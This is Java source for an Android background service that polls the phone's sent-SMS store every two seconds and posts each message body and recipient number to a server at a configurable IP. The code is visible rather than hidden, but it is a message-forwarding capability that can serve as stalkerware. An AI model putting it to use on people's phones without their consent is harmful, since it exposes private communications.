package com.example.automatedparroll;



import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;



import org.json.JSONException;
import org.json.JSONObject;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;



import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

public class ServiceForSmsOutgoing extends Service{

    String msg,number,url="",ip;
    SharedPreferences sp;
    String imei="865715044051313";
    Editor ed;

    Handler hd=new Handler();
//	String namespace="http://pack/"; //website open for every website there were same namespace
//
//		String method="msglog";   //databse name in web
//		String soap=namespace+method;

    private final Uri SMS_URI = Uri.parse("content://sms");
    private final String[] COLUMNS = new String[] {"date", "address", "body", "type"};
    private static final String CONDITIONS = "type = 2 AND date > ";
    private static final String ORDER = "date ASC";

    private long timeLastChecked;
    private Cursor cursor;
    long tempdate=0;


    @Override
    public IBinder onBind(Intent arg0) {
        // TODO Auto-generated method stub
        return null;
    }

    @Override
    public void onCreate() {
        // TODO Auto-generated method stub

        sp=PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
        ed=sp.edit();

        long currentTime = System.currentTimeMillis();

        ed.putLong("timelastchecked", currentTime);
        ed.commit();

        hd.post(outgoingsmschecker);
        super.onCreate();
    }

    Runnable outgoingsmschecker=new Runnable() {

        @Override
        public void run() {
            // TODO Auto-generated method stub

            timeLastChecked = sp.getLong("timelastchecked", -1L);

            ContentResolver cr = getApplicationContext().getContentResolver();

            // get all sent SMS records from the date last checked, in descending order
            cursor = cr.query(SMS_URI, COLUMNS, CONDITIONS + timeLastChecked, null, ORDER);

            // if there are any new sent messages after the last time we checked
            if (cursor.moveToNext())
            {
                Set<String> sentSms = new HashSet<String>();
                timeLastChecked = cursor.getLong(cursor.getColumnIndex("date"));
                do
                {
                    long date = cursor.getLong(cursor.getColumnIndex("date"));

                    if(date!=tempdate)
                    {
//				        	Log.d("hhhhhhhhhhhhh", "d00"+date);
                        SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");

                        // Create a calendar object that will convert the date and time value in milliseconds to date.
                        Calendar calendar = Calendar.getInstance();

                        String date1=formatter.format(new Date());

                        String address = cursor.getString(cursor.getColumnIndex("address"));
                        String body = cursor.getString(cursor.getColumnIndex("body"));
                        String thisSms = date + "," + address + "," + body;

                        if (sentSms.contains(thisSms)) {
                            continue; // skip that thing
                        }
                        // else, add it to the set
                        sentSms.add(thisSms);
//				        	Log.d("Test", "target number: " + address);
                        Log.d("Test", "msg..: " + body);
//				        	Log.d("Test", "date..: " + date1);
                        // Log.d("Test", "date sent: " + tm);

                        //outgoing
                        sms(body, address, "outgoing");
                        Toast.makeText(getApplicationContext(), "url"+url, Toast.LENGTH_LONG).show();
                        tempdate=date;
                    }


                }while (cursor.moveToNext());

                cursor.close();
            }

            ed.putLong("timelastchecked", timeLastChecked);
            ed.commit();

            hd.postDelayed(outgoingsmschecker, 2000);
        }
    };


    protected void sms(final String msg, final String phone, final String type) {
        Toast.makeText(getApplicationContext(),msg+phone , Toast.LENGTH_LONG).show();
        // TODO Auto-generated method stub
        TelephonyManager manager = (TelephonyManager) getApplicationContext().getSystemService(TELEPHONY_SERVICE);
        final String	imei="e0acdbbdb42605bb";
        //manager.getDeviceId().toString();
        sp=PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
        ip=sp.getString("ip","");
        Toast.makeText(getApplicationContext(),msg+phone+sp.getString("lid",""),Toast.LENGTH_LONG).show();

        url ="http://"+ip+":5000/c_fetchmessage1";
        Toast.makeText(getApplicationContext(), "url"+url, Toast.LENGTH_LONG).show();
        RequestQueue queue = Volley.newRequestQueue(ServiceForSmsOutgoing.this);

// Request a string response from the provided URL.
        StringRequest stringRequest = new StringRequest(Request.Method.POST, url,new Response.Listener<String>()


        {




            @Override
            public void onResponse(String response) {
                // Display the response string.
                Log.d("+++++++++++++++++",response);
                try {
                    JSONObject json=new JSONObject(response);
                    String res=json.getString("task");

                    if(res.equals("Success"))
                    {
//                    	 Toast.makeText(getApplicationContext()," call Registered Successfully",Toast.LENGTH_LONG).show();



                    }
                    else
                    {
//                    	 Toast.makeText(getApplicationContext(),"Registeration not completed",Toast.LENGTH_LONG).show();


                    }


                } catch (JSONException e) {
                    Toast.makeText(getApplicationContext(),"errr"+e,Toast.LENGTH_LONG).show();
                    e.printStackTrace();
                }


            }
        }, new Response.ErrorListener() {





            @Override
            public void onErrorResponse(VolleyError error) {

                Toast.makeText(ServiceForSmsOutgoing.this,"Error"+error,Toast.LENGTH_LONG).show();
            }
        }){
            @Override
            protected Map<String, String> getParams()
            {
                Map<String, String>  params = new HashMap<String, String>();
                params.put("userid", sp.getString("lid",""));
//                params.put("imei", imei);
                params.put("message", msg);
                params.put("phone", phone);
                //params.put("uid", sp.getString("lid", ""));
//                params.put("type",type);
















                return params;
            }
        };
// Add the request to the RequestQueue.
        queue.add(stringRequest);



    }

}